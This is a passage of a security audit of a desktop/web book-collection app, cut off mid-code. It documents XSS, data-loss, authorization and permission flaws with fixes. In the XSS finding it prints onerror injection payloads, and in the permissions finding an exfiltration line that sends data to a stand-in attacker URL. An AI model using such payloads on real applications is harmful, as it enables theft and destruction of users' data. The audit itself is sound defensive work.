# Collectyx — Security, Correctness & Reliability Audit

**Date:** 2026-08-07
**Scope reviewed:** `src/` (index.html, 24 JS, 14 CSS, 2 vendored libs), `src-tauri/`
(12 Rust files, schema, migrations, `tauri.conf.json`, `capabilities/default.json`),
`tests/` (6 suites), `Cargo.toml`, `package.json`.
**Version:** 0.1.0, schema v2.

---

## Scope correction

The audit brief specifies a REST API, multi-user architecture, per-user API keys,
and Tokio async. **None of these exist in this codebase.** There is no HTTP server,
no network listener, no authentication, no credential of any kind, and no async
runtime — `grep` for `reqwest|hyper|axum|tokio|listen|serve` across `src-tauri/src/`
returns nothing, and the only matches for `api.key` in `src/js/` are three comments
describing a hypothetical future.

What actually exists:

- A **Tauri v2 desktop app** — synchronous `rusqlite` behind a `Mutex<Connection>`,
  reached from the webview over Tauri IPC (`invoke`).
- A **web build** — the same frontend against IndexedDB, no backend at all.
- A single implicit user: `DEFAULT_OWNER = 'local'`. The schema carries an `owner`
  column, and `Settings → Owner (Testing)` lets anyone type a new owner key with no
  credential.

The audit below therefore covers what is here. Where a brief category has no
counterpart, it is marked N/A in "Categories not applicable" rather than padded.
Where the current code establishes a contract that becomes an authorization
boundary once D1 sync lands, that is called out explicitly — the owner-scoping
defects in §H2 and §H3 are exactly the code that must not ship into a multi-user
world unchanged.

---

## Executive Summary

### Overall security rating: **4 / 10**

The frontend has a real security discipline running through most of it — every
collection view, the tags view, and the hamburger menu escape user data before
interpolating it into `innerHTML`, there are no inline event handlers, no inline
`<script>`, no `eval`, no `localStorage`, and the Tauri CSP is genuinely tight.
The Rust is 100% safe code with zero `unsafe`, and every SQL statement in the
codebase is parameterised — there is no SQL injection anywhere.

The rating is dragged down by three things. First, the escaping discipline has a
hole in exactly one file — `dashboard.js` — and the web build ships with no CSP at
all, so that hole is live. Second, the destructive paths (restore, `replace_all_*`,
every `delete_*`) apply no validation and no owner predicate; `executeRestore()`
deletes the user's entire library before it has established that the replacement
data is usable. Third, the project's own test suite — the mechanism that would
catch all of this on the next change — is broken: 4 of 6 suites fail, and one of
them fails for a reason that shows the test itself was never correct.

None of these are hard to fix. Most are small, localised patches.

### Top five risks

1. **Stored XSS on the Dashboard, unmitigated in the web build.** `renderTopTags`,
   `renderRecentBooks`, and `renderWhatsNext` interpolate `Title`, `Author`, and
   tag `Name` into `innerHTML` with no escaping, while `escapeHtml()` sits in
   `core.js` and is used correctly everywhere else. `index.html` carries no CSP
   meta tag, so the web build has no backstop. Proven executable (§C1).
2. **`executeRestore()` is a wipe-then-hope.** It deletes every item and every tag
   one call at a time, then starts inserting. There is no transaction, no
   validation of the parsed file before the wipe, and no snapshot. A malformed
   backup — or a crash, or a single rejected record — leaves the user with nothing
   and an error message (§C2).
3. **`replace_all_consumed` / `_queued` / `_owned` issue an unqualified `DELETE`.**
   `replace_all_tags`, ten lines away in a sibling file, correctly scopes its
   delete to the active owner. The three collection commands do not. Demonstrated
   against real SQLite (§H1).
4. **Every mutating IPC command trusts a client-supplied id with no owner check.**
   `delete_item`, the three `delete_*`, `attach_tag`, `detach_tag`,
   `toggle_currently_reading`, `save_tag`, `delete_tag`, and `merge_items` all act
   on a bare id. `upsert_item` goes further and sets `owner = excluded.owner`,
   transferring an item to whoever last wrote it (§H2).
5. **Capabilities granted far beyond what the app uses.** `shell:default`,
   `fs:default`, `fs:allow-write-file`, `fs:allow-write-text-file`, plus the
   `shell`, `fs`, and `persisted-scope` plugins are all registered. The frontend
   calls none of them — `grep` for `__TAURI_PLUGIN_FS__` and `shell` in `src/js/`
   returns zero hits. Every one of these is reachable from an XSS payload (§H3).

### Most likely attack vectors

Ranked by how little the attacker has to arrange:

1. **A malicious or corrupted CSV / backup file the user imports themselves.** This
   is the whole attack surface, and it is a big one: it reaches stored XSS (§C1),
   total data loss (§C2), the statistics DoS (§M3), and every unvalidated field
   (§M5). Collectyx has no other input channel, and both import paths apply
   essentially no validation.
2. **The Tauri IPC boundary directly.** In a webview, `withGlobalTauri: true` puts
   `window.__TAURI__.core.invoke` on the global object. Anything that runs script
   in the webview owns the database and the over-granted plugins.
3. **A shared or exported CSV opened in Excel.** `_field()` quotes on `"`, `,`,
   `\n`, `\r` and nothing else, so `=`, `+`, `-`, `@` pass through unprefixed
   (§M4).

### Most severe vulnerabilities

`C1` (stored XSS → full IPC access in Tauri, full origin compromise on the web
demo) and `C2` (unconditional destruction of all user data). `C1` is the more
severe in the web build because there is no CSP; `C2` is more severe in practice
because it needs no attacker at all — a truncated download or a `.json.gz` that
fails to inflate is enough.

---

## Detailed Findings

Severity: Critical / High / Medium / Low. Confidence: High / Medium / Low.
Every finding below was verified by reading the code and, where marked
**Verified**, by executing it. Nothing is asserted from pattern-matching alone.

---

### C1 — Stored XSS: Dashboard renders user data into `innerHTML` unescaped; web build has no CSP

**Severity:** Critical (web build) / High (Tauri build) · **Confidence:** High · **Verified**

**Location**
- `src/js/dashboard.js` — `renderTopTags()` line 283; `renderRecentBooks()` lines 310–311;
  `renderWhatsNext()` lines 472, 474–475; `renderReadingGoals()` line 324.
- `src/index.html` — no `<meta http-equiv="Content-Security-Policy">` anywhere.
- Contrast: `src/js/core.js:212` `escapeHtml()`, applied correctly in
  `consumed-view.js:220–227`, `queued-view.js:279–289`, `owned-view.js:42–47`,
  `tags.js:319–320`, `collection-view.js:99–105`, `sidebar.js:633–635`.

**Explanation**

The codebase has a working escaper and uses it consistently — with one exception.
`dashboard.js` was written against a different discipline and interpolates raw:

```js
// dashboard.js:281-286
const html = sorted.map(tag => `
    <div class="top-tags-item">
        <span class="top-tags-name">${tag.Name}</span>      // <-- raw
        <span class="top-tags-count">${tag.Count}</span>
    </div>
`).join('');
container.innerHTML = html;
```

Same shape at lines 310–311 (`${book.Title}`, `${book.Author}`), 474–475
(`${book.Title}`, `${book.Author}`), 472 (`${rankDisplay}`), and 324
(`${dailyGoal}`, which comes from the settings JSON blob and is therefore
restore-controlled).

Nothing upstream sanitises these. `Title` and `Author` are written verbatim by
`COLLECTION_IO_SPEC.consumed.fromRow()` (`collection-io.js:353–354` — `.trim()`
only) and by `replaceCollection()` on the restore path. Tag names are validated by
`validateTagName()` against `/^[a-z0-9_-]+$/i`, but **only in the browser**:
`reconcile_tags` in `common.rs:185–189` and `JoinHelpers.splitRecord` in
`db-manager-web.js:213–215` both only trim and lowercase, so the restore path
bypasses the format rule entirely.

**Verified.** Running the real `dashboard.js` functions against a DOM shim:

```
=== renderTopTags(tags) — dashboard.js:269 ===
<span class="top-tags-name"><img src=x onerror="window.__TAURI__.core.invoke('delete_item',{id:'x'})"></span>

VERDICT
  topTagsContent       payload reaches innerHTML unescaped: true
  recentBooks          payload reaches innerHTML unescaped: true
  whatsNextContent     payload reaches innerHTML unescaped: true
```

And the delivery path, through the real CSV parser and spec:

```
parsed Title : "<img src=x onerror=alert(document.domain)>"
fromRow Title: "<img src=x onerror=alert(document.domain)>"
SURVIVES: true
```

**Attack scenario**

A user imports a book list — from a friend, a forum, a Goodreads export someone
reposted. One row's Title is `<img src=x onerror=...>`. Nothing rejects it; the
Books Read list renders it escaped and it looks like garbage text. The user opens
the Dashboard. `renderRecentBooks()` writes it into `innerHTML` and the handler
fires.

- **Web build:** no CSP. The payload runs with full access to the origin — it can
  read and rewrite the entire IndexedDB collection, exfiltrate it, or silently
  corrupt records. On the public demo this is a full origin compromise.
- **Tauri build:** `script-src 'self'` blocks the inline handler, so this specific
  payload does not execute. That is a backstop working as intended, not an absent
  vulnerability — the missing escaping is the defect, and the moment a
  `style-src 'unsafe-inline'`-compatible vector, a CSP relaxation, or a webview
  parser quirk appears, `withGlobalTauri: true` hands the payload
  `window.__TAURI__.core.invoke` and with it every registered command plus the
  over-granted `shell` and `fs` plugins (§H3).

**Impact**

Web: arbitrary script in the app origin; complete read/write of the user's library.
Tauri: currently contained by CSP; a single-line CSP change or webview quirk turns
it into full local database compromise and `plugin:shell|open` on arbitrary URIs.

**Recommended fix**

Two independent changes; do both.

1. Escape at the four sinks in `dashboard.js`. `escapeHtml` is already global.
2. Add a CSP meta tag to `index.html` so the web build has the same backstop the
   Tauri build has. It must be a `<meta>` tag, not a server header — the web build
   is served as static files and cannot rely on the host.

Optionally, add server-side format validation for tag names in `reconcile_tags`
to match the UI rule (see §M5).

**Example corrected code**

```js
// dashboard.js — renderTopTags()
const html = sorted.map(tag => `
    <div class="top-tags-item">
        <span class="top-tags-name">${escapeHtml(tag.Name)}</span>
        <span class="top-tags-count">${escapeHtml(String(tag.Count ?? 0))}</span>
    </div>
`).join('');

// dashboard.js — renderRecentBooks()
const html = recentBooks.map(book => `
    <div class="recent-book-item">
        <div class="recent-book-title">${escapeHtml(book.Title || '')}</div>
        <div class="recent-book-author">by ${escapeHtml(book.Author || '')}</div>
    </div>
`).join('');

// dashboard.js — renderWhatsNext()
const rankDisplay = book.Rank != null ? String(book.Rank) : 'Unranked';
return `
    <div class="whats-next-item">
        <div class="whats-next-rank">${escapeHtml(rankDisplay)}</div>
        <div class="whats-next-details">
            <div class="whats-next-title">${escapeHtml(book.Title || '')}</div>
            <div class="whats-next-author">by ${escapeHtml(book.Author || '')}</div>
        </div>
    </div>
`;

// dashboard.js — renderReadingGoals(): dailyGoal is restore-controlled
const dailyGoal = Number.isFinite(Number(settings.dailyReadingGoal))
    ? Number(settings.dailyReadingGoal)
    : CONSTANTS.DEFAULT_DAILY_READING_GOAL;
goalDisplay.textContent = `Daily Goal: ${dailyGoal} pages`;
```

```html
<!-- index.html, in <head>, mirroring tauri.conf.json's policy -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
               img-src 'self' data:; connect-src 'self';
               object-src 'none'; base-uri 'none'; form-action 'none'">
```

**Tracked as:** `COLLECTYX-SEC-01`, `COLLECTYX-SEC-02`

---

### C2 — `executeRestore()` destroys all data before validating the replacement

**Severity:** Critical · **Confidence:** High

**Location:** `src/js/backup-restore.js` — `executeRestore()` lines 241–306;
`continueToScreen2()` lines 140–156.

**Explanation**

The restore sequence is:

```js
// backup-restore.js:249-256
const currentItems = await DBManager.getAllItems();
for (const item of currentItems) {
    await DBManager.deleteItem(item.id);          // cascades memberships + tags
}
const currentTags = await DBManager.getAllTags();
for (const tag of currentTags) {
    await DBManager.deleteTag(tag.id);
}
// ...only now does it start writing the replacement
for (const item of (data.Items || [])) {
    await DBManager.saveItem(item);
}
```

Three separate problems compound:

1. **No validation before the wipe.** `continueToScreen2()` does `JSON.parse` and
   nothing else. `data.Items` is never checked for being an array, `data.Consumed`
   is never checked for shape, and no record is checked for required fields. The
   count comparison shown on screen 2 uses `(data.Consumed || []).length`, which
   reads `undefined` as 0 and shows the user a plausible-looking table for a file
   that will fail on the first insert.

2. **No transaction.** These are N+M independent calls. There is no rollback and
   no snapshot. On Tauri each is a separate IPC round trip committing
   independently; on web each `deleteItem` is its own IndexedDB transaction.

3. **Failure leaves nothing.** The `catch` at line 299 writes
   `'Restore failed: ' + e.message` into a div and re-disables the button. The
   library is already gone.

A concrete trigger needs no attacker: `data.Items` being a string (a hand-edited
file, a truncated download) makes `for...of` iterate characters, so `saveItem('a')`
is called; on Tauri serde rejects it and the whole restore aborts — after the wipe.

**Attack scenario**

The user's disk is filling up. They take a backup, then restore it a week later to
undo a bad bulk edit. The `.json.gz` was truncated by the interrupted write. `pako`
inflates the partial stream, `JSON.parse` happens to succeed on the truncated
object (or the user picks the uncompressed export instead, where truncation is even
more likely to still parse). Screen 2 shows counts. They tick the box. Everything
is deleted; the first insert fails; they now have neither the old library nor the
new one.

**Impact**

Irreversible loss of the user's entire collection. For a book-tracking app whose
whole value is a decade of reading history, this is the worst outcome the software
can produce, and it is reachable through the feature explicitly designed to
prevent it.

**Recommended fix**

1. Validate the parsed structure fully *before* leaving screen 2 — shape, types,
   required fields per record — and refuse to advance if it fails.
2. Snapshot the current data in memory before the wipe and restore it if anything
   throws.
3. Longer term, add a `restore_all` Rust command that performs the wipe and the
   inserts in one `rusqlite` transaction, and an equivalent single `_rawWrite` on
   the web side. Both backends already demonstrate this pattern
   (`replace_all_consumed`, `_rawWrite`) — restore is the one destructive path that
   does not use it.

**Example corrected code**

```js
// backup-restore.js — validate before the wipe
_validate(data) {
    const errors = [];
    if (!data || typeof data !== 'object' || Array.isArray(data)) {
        return ['Backup file is not an object'];
    }
    for (const key of ['Items', 'Consumed', 'Queued', 'Owned', 'Tags']) {
        if (data[key] !== undefined && !Array.isArray(data[key])) {
            errors.push(`${key} must be an array, got ${typeof data[key]}`);
        }
    }
    (data.Items || []).forEach((it, i) => {
        if (!it || typeof it !== 'object') errors.push(`Items[${i}] is not an object`);
        else if (typeof it.Title !== 'string' || !it.Title.trim()) {
            errors.push(`Items[${i}] has no Title`);
        }
    });
    (data.Consumed || []).forEach((r, i) => {
        if (!r || typeof r !== 'object') errors.push(`Consumed[${i}] is not an object`);
        else if (r.Finished != null && !/^\d{4}-\d{2}-\d{2}$/.test(r.Finished)) {
            errors.push(`Consumed[${i}].Finished is not YYYY-MM-DD`);
        }
    });
    return errors;
}

async executeRestore() {
    if (!this._parsedData) return;
    const data = this._parsedData;

    const errors = this._validate(data);
    if (errors.length) {
        this._showRestoreError(
            `Backup file is not valid — nothing was changed.\n` +
            errors.slice(0, 5).join('\n') +
            (errors.length > 5 ? `\n(+${errors.length - 5} more)` : '')
        );
        return;
    }

    // Snapshot before touching anything, so a mid-flight failure is recoverable.
    let snapshot = null;
    try {
        snapshot = await this._gatherAllData();
    } catch (e) {
        this._showRestoreError('Could not snapshot current data — restore aborted.');
        return;
    }

    try {
        await this._wipeAndWrite(data);
    } catch (e) {
        console.error('executeRestore failed, rolling back', e);
        try {
            await this._wipeAndWrite(snapshot);
            this._showRestoreError('Restore failed — your previous data was put back.');
        } catch (rollbackError) {
            console.error('ROLLBACK ALSO FAILED', rollbackError);
            this._showRestoreError(
                'Restore failed AND rollback failed. Your data may be incomplete. ' +
                'Do not close the app — a snapshot is in the console.'
            );
            console.warn('RECOVERY SNAPSHOT:', JSON.stringify(snapshot));
        }
        return;
    }
    // ...success path unchanged
}
```

**Tracked as:** `COLLECTYX-SEC-03`

---

### H1 — `replace_all_*` deletes every row regardless of owner

**Severity:** High · **Confidence:** High · **Verified**

**Location:**
- `src-tauri/src/commands/consumed.rs:178`, `queued.rs:196`, `owned.rs:165`
- `src/js/db-manager-web.js:671` — `{ store: collection, action: 'clear' }`
- Contrast: `src-tauri/src/commands/tags.rs:158`

**Explanation**

`replace_all_tags` gets this right:

```rust
// tags.rs:158
tx.execute("DELETE FROM tags WHERE owner = ?1", params![owner])
```

The three collection equivalents do not:

```rust
// consumed.rs:178 — identical in queued.rs and owned.rs
tx.execute("DELETE FROM consumed", [])
```

The web backend has the same defect in a different dialect: `replaceCollection`
queues `{ store: collection, action: 'clear' }`, which empties the whole object
store. Meanwhile `getCollection()` filters by owner
(`db-manager-web.js:573`, `joinCollection`'s `ownerFilter`), and every `SELECT_JOINED`
carries `WHERE i.owner = ?1`. So reads are scoped and destructive writes are not —
which is precisely backwards.

**Verified.** Executing the exact statement against a two-owner fixture:

```
BEFORE  consumed: alice=1 bob=1 | tags: alice=1 bob=1
--- alice runs a restore. replace_all_consumed executes verbatim: ---
    consumed.rs:178   tx.execute("DELETE FROM consumed", [])
AFTER   consumed: alice=0 bob=0   <-- bob had no restore run

--- contrast: replace_all_tags IS scoped (tags.rs:158) ---
AFTER   tags: alice=0 bob=1   <-- bob keeps his tags
```

**Attack scenario**

Today this needs the Owner (Testing) switch: the user creates owner `alice`, adds
books, switches to `bob`, adds more, switches back to `alice`, restores a backup —
and `bob`'s Books Read is gone with no warning and no message. The inconsistency
with `replace_all_tags` means the same restore leaves `bob`'s *tags* intact, so the
user is left with a partially-destroyed second profile.

Under D1 sync this becomes one tenant's restore truncating the shared table.

**Impact**

Silent cross-owner data destruction. The `owner` column exists specifically so that
multi-user sync needs no migration (design doc §6.4) — but the destructive path
does not honour it, so the guarantee the column was added to provide does not hold.

**Recommended fix**

Scope the delete through the `item_id` join, matching how the reads already work.

**Example corrected code**

```rust
// consumed.rs — replace_all_consumed
let owner = common::current_owner(&db);
let tx = db.transaction().map_err(|e| e.to_string())?;

tx.execute(
    "DELETE FROM consumed
      WHERE item_id IN (SELECT id FROM items WHERE owner = ?1)",
    params![owner],
).map_err(|e| e.to_string())?;
```

```js
// db-manager-web.js — replaceCollection: delete only this owner's rows
const items = await this._load(S.ITEMS);
const ownedItemIds = new Set(
    items.filter(i => i.owner === defaults.owner).map(i => i.id)
);
const existingMemberships = await this._load(collection);
const ops = existingMemberships
    .filter(m => ownedItemIds.has(m.item_id))
    .map(m => ({ store: collection, action: 'delete', key: m.id }));
// ...then push the puts as before
```

**Tracked as:** `COLLECTYX-SEC-04`

---

### H2 — Mutating IPC commands accept a client-supplied id with no owner predicate; `upsert_item` transfers ownership

**Severity:** High · **Confidence:** High · **Verified**

**Location:**
- `src-tauri/src/commands/items.rs:109` `delete_item`, `:117` `attach_tag`,
  `:128` `detach_tag`, `:148` `merge_items`, `:310` `save_item`
- `consumed.rs:159` `delete_consumed`; `queued.rs:162` `delete_queued`,
  `:172` `toggle_currently_reading`; `owned.rs:149` `delete_owned`
- `tags.rs:68` `save_tag`, `:114` `delete_tag`
- `src-tauri/src/commands/common.rs:137` — `owner = excluded.owner`

**Explanation**

Every read command resolves the active owner server-side via
`common::current_owner(&db)` and filters on it. No mutating command does. They take
an id straight from the IPC payload and act on it:

```rust
// items.rs:109-114
pub fn delete_item(state: State<AppState>, id: String) -> Result<(), String> {
    let db = state.db.lock().map_err(|e| e.to_string())?;
    db.execute("DELETE FROM items WHERE id = ?1", params![id])   // no owner predicate
        .map_err(|e| e.to_string())?;
    Ok(())
}
```

`upsert_item` is worse — it does not merely fail to check ownership, it reassigns it:

```rust
// common.rs:136-137
ON CONFLICT(id) DO UPDATE SET
   owner         = excluded.owner,
```

So a save carrying an existing `ItemId` and a different `Owner` moves that item to
the new owner, taking its `consumed`/`queued`/`owned` rows with it (they join
through `item_id`). `save_item` at `items.rs:321` has the identical clause.

**Verified.**

```
--- delete_item / delete_consumed take a bare id with no owner predicate ---
    items.rs:111  DELETE FROM items WHERE id = ?1
        bob items remaining = 0   <-- deleted while current_owner = alice
```

**Attack scenario**

Locally today, the id has to be known, and `getCollection` won't hand you another
owner's ids — so this is latent rather than live. It matters for two reasons.

First, ids are not unguessable: `new_uuid()` produces highly structured output from
a clock-seeded PRNG (§M1), so given one id and an approximate creation time the
neighbourhood is enumerable. Second and more importantly, this is the exact code
that becomes the authorization layer under D1. The classic BOLA shape —
"server takes the object id from the client and trusts it" — is already fully
written; adding a network in front of it converts every one of these eleven
commands into an IDOR with no further mistakes required.

**Impact**

Today: cross-owner deletion and ownership transfer reachable from the IPC boundary
(and therefore from any XSS). Under D1: eleven ready-made broken-object-level-
authorization endpoints.

**Recommended fix**

Make owner scoping structural, not per-command discipline. Add one helper and route
every mutating command through it.

**Example corrected code**

```rust
// common.rs — one place that decides whether the active owner may touch an item
pub fn assert_item_owned(conn: &rusqlite::Connection, item_id: &str) -> Result<(), String> {
    let owner = current_owner(conn);
    let ok: bool = conn.query_row(
        "SELECT 1 FROM items WHERE id = ?1 AND owner = ?2",
        params![item_id, owner],
        |_| Ok(true),
    ).unwrap_or(false);
    // Same error for "not yours" and "does not exist" — do not confirm existence.
    if ok { Ok(()) } else { Err("Item not found".to_string()) }
}

// items.rs — delete_item
#[tauri::command]
pub fn delete_item(state: State<AppState>, id: String) -> Result<(), String> {
    let db = state.db.lock().map_err(|e| e.to_string())?;
    common::assert_item_owned(&db, &id)?;
    db.execute(
        "DELETE FROM items WHERE id = ?1 AND owner = ?2",
        params![id, common::current_owner(&db)],
    ).map_err(|e| e.to_string())?;
    Ok(())
}

// consumed.rs — delete_consumed: scope through the join
#[tauri::command]
pub fn delete_consumed(state: State<AppState>, id: String) -> Result<(), String> {
    let db = state.db.lock().map_err(|e| e.to_string())?;
    let owner = common::current_owner(&db);
    db.execute(
        "DELETE FROM consumed
          WHERE id = ?1
            AND item_id IN (SELECT id FROM items WHERE owner = ?2)",
        params![id, owner],
    ).map_err(|e| e.to_string())?;
    Ok(())
}
```

```rust
// common.rs — upsert_item: never let a payload move an item between owners
let owner = current_owner(tx);   // server-derived, payload's Owner ignored
// ...
ON CONFLICT(id) DO UPDATE SET
   media_type_id = excluded.media_type_id,
   title         = CASE WHEN excluded.title != '' THEN excluded.title ELSE items.title END,
   -- owner deliberately absent: ownership is never transferred by a save
```

Note this last change requires the upsert to be guarded by `assert_item_owned`
first, or a save against another owner's `ItemId` silently overwrites their record
while leaving `owner` alone.

**Tracked as:** `COLLECTYX-SEC-05`

---

### H3 — Tauri capabilities and plugins granted well beyond what the app uses

**Severity:** High · **Confidence:** High · **Verified**

**Location:** `src-tauri/capabilities/default.json:8–18`; `src-tauri/src/lib.rs:44–47`;
`src-tauri/Cargo.toml` dependencies.

**Explanation**

Granted:

```json
"permissions": [
  "core:default", "dialog:default", "dialog:allow-open", "dialog:allow-save",
  "dialog:allow-message", "fs:default", "fs:allow-write-text-file",
  "fs:allow-write-file", "shell:default"
]
```

Registered: `tauri_plugin_dialog`, `tauri_plugin_fs`, `tauri_plugin_persisted_scope`,
`tauri_plugin_shell`.

Actually used by the frontend:

```
=== shell plugin usage in JS ===   (only false positives — a comment and a string)
=== fs plugin usage ===            (empty)
```

The only real plugin call in the entire frontend is
`settings.js:61` — `window.__TAURI_PLUGIN_DIALOG__.open({ directory: true })`.
Everything else is unused:

- **`shell:default`** includes `shell:allow-open`, which lets the webview hand
  arbitrary URIs to the OS handler. Zero call sites.
- **`fs:default` + the two write grants** — zero call sites. `downloadFile()`
  (`collection-io.js:589`) uses a Blob and an anchor click on both builds, and the
  file at line 580 explains why: the fs plugin API "hasn't been exercised anywhere
  in this codebase yet."
- **`tauri-plugin-persisted-scope`** persists dialog-granted filesystem scopes
  across restarts. Since nothing writes through the fs plugin, its only effect is
  to make any scope that is ever granted permanent.
- **`dialog:allow-save`** — zero call sites.
- **`dialog:allow-message`** — one call site, `confirmDialog()` at `core.js:200`,
  which is dead code (`grep confirmDialog src/` finds only its own definition).
  It was superseded by `Confirm.open()` and never removed.

The `backupFolder` setting is collected and stored but never used for anything —
`downloadFile()` ignores it.

**Attack scenario**

This is the blast-radius multiplier for §C1. On its own it is not exploitable — it
is what determines how bad the XSS gets. Chained: injected script calls
`invoke('plugin:shell|open', { path: 'https://attacker/?d=' + data })` for
exfiltration that `connect-src 'self' ipc:` would otherwise block, or writes through
the fs plugin to any path a previously-granted persisted scope covers.

**Impact**

Turns a contained XSS into arbitrary URI launch and potential file write. Violates
least privilege on the one boundary Tauri exists to enforce, and Phase 0 task 5 of
the implementation plan explicitly called for trimming this list.

**Recommended fix**

Remove every grant and plugin with no call site. Keep `dialog:allow-open` for the
folder picker, or drop that too since `backupFolder` is unused. Delete
`confirmDialog()`. Capabilities are compiled into the binary, so verification
requires `rm -rf src-tauri/target/release` first.

**Example corrected code**

```json
{
  "$schema": "../gen/schemas/desktop-schema.json",
  "identifier": "default",
  "description": "Minimum permissions Collectyx actually uses.",
  "windows": ["main"],
  "permissions": [
    "core:default",
    "dialog:allow-open"
  ]
}
```

```rust
// lib.rs — drop the three unused plugins
        .plugin(tauri_plugin_dialog::init())
        .invoke_handler(tauri::generate_handler![ /* ... */ ])
```

```toml
# Cargo.toml — remove the corresponding dependencies
tauri-plugin-dialog = "2"
# tauri-plugin-fs, tauri-plugin-log, tauri-plugin-shell,
# tauri-plugin-persisted-scope removed
```

(`tauri-plugin-log` is used at `lib.rs:24` under `cfg!(debug_assertions)`; keep it
if debug logging is wanted, drop it otherwise.)

**Tracked as:** `COLLECTYX-SEC-06`

---

### M1 — `new_uuid()` is a clock-seeded xorshift, not a CSPRNG

**Severity:** Medium · **Confidence:** High (determinism, output correlation) /
Medium (real-world collision rate — platform clock granularity could not be measured here) · **Verified**

**Location:** `src-tauri/src/commands/common.rs:283–320`.

**Explanation**

```rust
let nanos = SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_nanos()).unwrap_or(0);
let boxed = Box::new(0u8);
let addr = &*boxed as *const u8 as usize as u128;
let mut state = nanos ^ (addr << 32) ^ 0x9E37_79B9_7F4A_7C15;
```

Three properties follow:

1. **The only varying input is the wall clock.** The XOR constant is fixed, and
   `addr` comes from allocating and immediately freeing one byte — the allocator
   hands back the same slot on essentially every call in a loop, so within a process
   it is effectively constant.
2. **It is fully deterministic.** Same `(nanos, addr)` → same UUID.
3. **The shift constants 13/7/17 are xorshift64's, applied to a `u128`.** The
   generator is called exactly twice and only the low 64 bits of each output are
   used.

**Verified** by porting the function to Python and evaluating it:

```
=== 1. identical (nanos, addr) -> identical UUID ===
ad5f4a9c9c41437b9280b4fc908b1556
ad5f4a9c9c41437b9280b4fc908b1556
collide: True

=== 2. adjacent nanoseconds ===
  +0ns  ad5f4a9c 9c41437b 9280b4fc908b1556
  +1ns  ec7fc8dc 9c41437b 9394b5f096ca1546
  +2ns  2f1f4e1d 9c41437b 91a8b4e49c091576
  +3ns  6e3fcc5d 9c41437b 90bcb5e89a481566
  +4ns  a9de429e 9d41437b 94d1b4cc888f1416

=== 3. distinct outputs over N consecutive ns ===
  N= 1000000  distinct= 1000000  collisions=0
```

Bytes 4–7 are effectively constant across adjacent nanoseconds, and the trailing
bytes change in small increments. Only the first four bytes vary meaningfully.

Being accurate about the risk: over a million *distinct* nanosecond values there
are no collisions, so this is not a birthday problem. The exposure is same-tick.
On Linux `SystemTime::now()` has nanosecond granularity and consecutive calls are
separated by SQL work, so collisions are unlikely. On Windows the practical floor
is coarser, and two `new_uuid()` calls inside one `write_one` (`common::new_uuid`
for the membership id and another inside `upsert_item`) can land in the same tick.
I could not measure Windows clock granularity in this container, so the collision
frequency is **Requires Verification**; the determinism and the output correlation
are not.

For contrast, the web backend uses `crypto.randomUUID()`
(`db-manager-web.js:495`) — a proper CSPRNG. The two backends produce IDs of
completely different quality for the same schema.

**Attack scenario**

Today: a same-tick collision makes `INSERT ... ON CONFLICT(id) DO UPDATE` silently
overwrite an unrelated row instead of inserting — a lost book, no error. Under D1,
where ids become the object identifiers in an API, the structural correlation makes
neighbouring ids enumerable from a known one plus an approximate timestamp.

**Impact**

Silent data overwrite; predictable object identifiers that will not be fit for
purpose as a security boundary once sync exists.

**Recommended fix**

Use `getrandom` (already an indirect dependency of the Tauri tree) or the `uuid`
crate with the `v4` feature. The comment says the crate was avoided "for one call
site" — but the hand-rolled substitute has to be right, and it is not.

**Example corrected code**

```toml
# Cargo.toml
uuid = { version = "1", features = ["v4"] }
```

```rust
// common.rs
pub fn new_uuid() -> String {
    uuid::Uuid::new_v4().to_string()
}
```

**Tracked as:** `COLLECTYX-SEC-07`

---

### M2 — Tauri cannot clear `Pages`, `Author`, `Author2`, or `ISBN`; contradicts design doc §6.3 and diverges from the web backend

**Severity:** Medium · **Confidence:** High · **Verified**

**Location:** `src-tauri/src/commands/common.rs:140–143`;
`src/js/db-manager-web.js:187–191`; `src/js/consumed-modal.js:124`;
`src/js/owned-modal.js:445`.

**Explanation**

Design doc §6.3 states the contract plainly: *"A field absent from the payload keeps
its stored value; a field present as `null` is cleared."* The web backend implements
it:

```js
// db-manager-web.js:189
if (has(js)) item[col] = record[js] != null ? record[js] : null;
```

`upsert_item` cannot, because `COALESCE` treats absent and explicit-null identically:

```rust
// common.rs:140-143
author  = COALESCE(excluded.author,  items.author),
author2 = COALESCE(excluded.author2, items.author2),
pages   = COALESCE(excluded.pages,   items.pages),
isbn    = COALESCE(excluded.isbn,    items.isbn),
```

The comment at `common.rs:113–118` acknowledges this and calls a real fix "a larger,
separate change." But it is not a theoretical gap — the modals send explicit nulls:

```js
// consumed-modal.js:124
Pages: document.getElementById('cbrPages').value ? parseInt(...) : null,
```

**Verified** against real SQLite using the exact statement:

```
stored:                            {"pages":412,"isbn":"9780441013593","author2":"Anderson"}
after clearing on TAURI:           {"pages":412,"isbn":"","author2":"Anderson"}
after clearing on WEB:             {"pages":null,"isbn":"","author2":null}

VERDICT
  Pages   cleared on web: true | cleared on Tauri: false
  Author2 cleared on web: true | cleared on Tauri: false
```

**Attack scenario**

No attacker. A user corrects a wrong page count by clearing the field and saving.
The desktop build silently keeps the old value; the web build clears it. The same
action against the same schema produces two different results.

There is a second, sharper edge. `db-manager-tauri.js:98–101` completes a partial
payload by reading the stored record first — but `getCollectionRecord` filters by
owner and returns `null` on a miss. When it misses, no completion happens, and
membership fields (which use plain `excluded.X`, not `COALESCE`) are written as
`NULL`. So `OwnedView.confirmCheckout`, which sends only
`{id, ItemId, Patron, CheckedOutDate}`, silently blanks `Location` and `Comments`
whenever that read fails. The absent-vs-null contract is enforced in JavaScript on
a best-effort basis and not enforced in Rust at all.

**Impact**

Data cannot be corrected on the desktop build. The two backends disagree about the
documented write contract. A failed completion read causes silent field loss.

**Recommended fix**

Represent the three states — absent, explicit null, value — in the type, using
`Option<Option<T>>` with `#[serde(default, deserialize_with = "double_option")]`.
Then the SQL can distinguish them, and the contract is enforced by the backend
rather than by a JS pre-pass that can fail.

**Example corrected code**

```rust
// common.rs
fn double_option<'de, T, D>(de: D) -> Result<Option<Option<T>>, D::Error>
where T: serde::Deserialize<'de>, D: serde::Deserializer<'de> {
    serde::Deserialize::deserialize(de).map(Some)
}

pub struct ItemFields {
    #[serde(rename = "Pages", default, deserialize_with = "double_option")]
    pub pages: Option<Option<i64>>,   // None = absent, Some(None) = clear
    // ...same for author, author2, isbn
}

// Bind a sentinel alongside each value so SQL can tell the two apart.
tx.execute(
    "INSERT INTO items (id, owner, media_type_id, title, author, author2, pages, isbn,
                        date_added, modified)
